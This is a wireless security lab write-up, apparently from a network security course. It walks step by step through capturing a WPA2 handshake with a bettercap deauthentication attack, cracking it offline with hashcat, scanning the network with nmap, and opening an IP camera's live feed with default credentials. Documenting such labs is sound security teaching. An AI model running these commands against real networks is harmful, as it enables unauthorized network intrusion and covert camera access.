# WPA2 Network Reconnaissance Lab

Offensive wireless assessment methodology covering WPA2 handshake capture, password cracking, network enumeration, and service discovery. Performed against an isolated lab network.

## Overview

This lab demonstrates a full wireless attack chain:

1. Adapter configuration for monitor mode
2. Passive reconnaissance and target identification with bettercap
3. Deauthentication attack to force handshake capture
4. Offline WPA2 cracking with hashcat
5. Post-association network enumeration with nmap
6. RTSP stream discovery and access

## Tools Used

- `bettercap` — wireless reconnaissance and deauth
- `airmon-ng` — monitor mode management
- `hcxpcapngtool` — handshake conversion (.pcap → .22000)
- `hashcat` — offline WPA2 cracking (mode 22000, rockyou.txt)
- `nmap` — host discovery and service enumeration
- `tcpdump` / `tshark` — packet capture and verification

## Lab Environment

Isolated wireless network with a mix of embedded Linux devices: OPNsense router (Raspberry Pi), Ubiquiti switch and AP, two Raspberry Pi servers, a Reolink IP camera, and one Intel workstation.

---

## Methodology

### 1. Adapter setup — monitor mode

```bash
lsusb                          # confirm adapter is visible
ip a                           # identify interface name (wlan0)
sudo airmon-ng check kill      # kill interfering processes
sudo airmon-ng start wlan0     # enable monitor mode
iwconfig                       # confirm wlan0mon is active
```

### 2. Reconnaissance — BSSID and client discovery

```bash
sudo bettercap -iface wlan0mon
```

Inside bettercap:

```
wifi.recon on
# identify target network SSID, note BSSID and channel
set wifi.recon.channel <CHANNEL>
set wifi.recon <TARGET_BSSID>
```

### 3. Deauthentication attack — handshake capture

```
wifi.deauth <TARGET_BSSID>
```

Bettercap writes the captured handshake automatically to `bettercap-wifi-handshakes.pcap`.

### 4. Password cracking

Convert the handshake to hashcat format:

```bash
hcxpcapngtool bettercap-wifi-handshakes.pcap -o handshake.22000
```

Run against rockyou.txt:

```bash
gzip -dc /usr/share/wordlists/rockyou.txt.gz > wordlist.txt
hashcat -m 22000 handshake.22000 wordlist.txt
```

Cracking time: approximately 10–15 minutes on a mid-range GPU.

### 5. Network enumeration

After connecting to the network, identify live hosts:

```bash
nmap -sn 192.168.1.0/24
```

Discovered hosts:

| IP | MAC vendor | Role |
|----|-----------|------|
| 192.168.1.1 | Raspberry Pi | OPNsense router |
| 192.168.1.100 | Ubiquiti | Switch |
| 192.168.1.101 | Ubiquiti | Access point |
| 192.168.1.103 | Raspberry Pi | Server |
| 192.168.1.104 | Reolink | IP camera |
| 192.168.1.107 | Intel | Workstation |
| 192.168.1.108 | Raspberry Pi | Server |

Full service scan:

```bash
sudo nmap -Pn -sS -sV -O --reason --open -T4 \
  192.168.1.100-101 192.168.1.103-104 192.168.1.107-108
```

Notable findings:
- Both Raspberry Pi servers (`.103`, `.108`) expose FTP, SSH, NFS, MariaDB, Apache Tomcat, and Nagios NSCA
- Reolink camera (`.104`) exposes RTSP on ports 554 and 6001, HTTP/HTTPS, and RTMP
- Intel workstation (`.107`) exposes RDP (3389) alongside SSH and MariaDB

### 6. RTSP stream access

The Reolink camera at `192.168.1.104` was accessible via browser. Default credentials were accepted, exposing a live camera feed pointed at a bookshelf in the lab.

---

## Key Takeaways

- WPA2 personal networks remain vulnerable to offline dictionary attacks when weak passwords are in use; the handshake can be captured passively after a single deauth
- Embedded Linux devices (Pi, Ubiquiti) frequently run minimal OSes with narrow attack surfaces, but exposed services like FTP and NFS on internal segments warrant attention
- IP cameras routinely ship with default credentials and should be treated as high-risk network assets
- RTSP streams are often unauthenticated or trivially authenticated on consumer hardware

## Notes

All activity performed on an isolated lab network with explicit authorization as part of coursework (PSU CS 596, Network Security, Summer 2025).